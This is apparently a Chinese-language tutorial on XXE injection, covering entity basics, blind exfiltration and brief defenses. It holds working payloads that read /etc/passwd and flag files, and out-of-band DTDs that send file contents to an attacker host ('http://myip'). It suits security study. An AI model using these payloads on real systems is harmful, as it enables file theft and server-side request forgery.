XXE原理？利用？防御？绕过？

## 基础知识

XML是一种结构性的标记语言，它用于配置文件、文档格式（如Word...）、图像格式（SVG，EXIF标题）和网络协议（WebDAV，SOAP...）。

XML 文档有自己的一个格式规范，包括XML声明、DTD约束（Document Type Definition 文档类型声明） 、文档元素。

**\* XXE（XML External Entity Injection）全称为 XML 外部实体注入**，关键是**外部实体**的解析。通过外部实体SYSTEM请求本地文件URI，通过某种方式返回本地文件内容就导致了XXE漏洞。

在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB...）。

DTD约束中ENTITY定义的实体分为两种，内部实体和**外部实体**（从外部的 dtd 文件中引用）。也分为**通用实体**（用 `&实体名;` 引用的实体，他在DTD 中定义，在 XML 文档中引用）和**参数实体**（使用 `% 实体名`在 DTD 中定义，在 DTD 中使用 `%实体名;` 引用）。

```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY normal "hello">  <!-- 内部通用实体 -->
    <!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">  <!-- 外部通用实体 -->
    <!ENTITY % para SYSTEM "file:///1234.dtd">  <!-- 外部参数实体 -->
    %para;            <!-- 引用参数实体 -->
]>
<message>&normal;</message>
```

**参数实体支持嵌套**定义，但需要注意的是，内层定义的参数实体%需要进行HTML转义，否则会出现解析错误。

```
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
]>
<message>&normal;</message>
```

## Normal XXE

利用file协议有回显的读取本地敏感文件。

如果文件内容存在特殊字符（如<> & " '）读取会报错，可以使用CDATA包裹起来。需要利用外部参数实体来进行参数拼接。

```
payload:
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 
<roottag>&all;</roottag>

evil.dtd:
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

## Blind XXE

现在有回显的XXE已经很少了，Blind XXE重点在于如何将数据传输出来。

通过引入外部服务器或者本地dtd文件，可以实现**OOB（out-of-band）信息传递**和通过构造dtd**从错误信息获取数据**。

无论是OOB、还是基于错误的方式，无一例外都需要引入外部DTD文件。

Note：几乎所有XML解析器都不会解析同级参数实体的内容，下面例子会报错。

```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % files SYSTEM "file:///etc/passwd">  
    <!ENTITY % send SYSTEM "http://myip/?a=%files;"> 
    %send;
]>
```

Note：下面例子可能会报错`PEReferences forbidden in internal subset in Entity PEReferences`，指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。

```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % file SYSTEM "file:///etc/passwd">  
    <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
    %start;
    %send;
]>
```

既然内部不行就**引用外部的DTD（远程服务器DTD或者本地DTD）**。协议本身要求不能在**内部的实体声明中**引用参数实体，但是很多XML解析器并没有很好的执行这个检查，几乎所有XML解析器是能够执行上述例子的。

1、引用服务器DTD：

```
payload:
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://myip/xml.dtd">  
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    %remote;
    %send;
]>
<message>1234</message>

xml.dtd:
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip:10001/?%file;'>">
%start;
```

2、引用本地DTD：如果服务器禁止访问外网。docbookx.dtd定义了很多参数实体并实现了调用，可以在内部重写一个该dtd文件中含有的参数实体，而此时调用是在外部。

```
payload:
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
    '> 
    %remote;
]>
<message>1234</message>
```

其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码。

## 防御

1、黑名单过滤用户提交的XML数据，过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC

2、使用语言中推荐的禁用外部实体的方法

## 绕过

XXE 其实也是一种类 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。

![img](https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png)

PHP在安装扩展以后还能支持的协议：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png)

绕过技巧：

- 如果是在 java 中还有一个协议能代替 file 协议 ，那就是 netdoc ，使用方法我会在后面的分析微信的 XXE。

## Ref

https://xz.aliyun.com/t/3357

https://www.freebuf.com/vuls/207639.html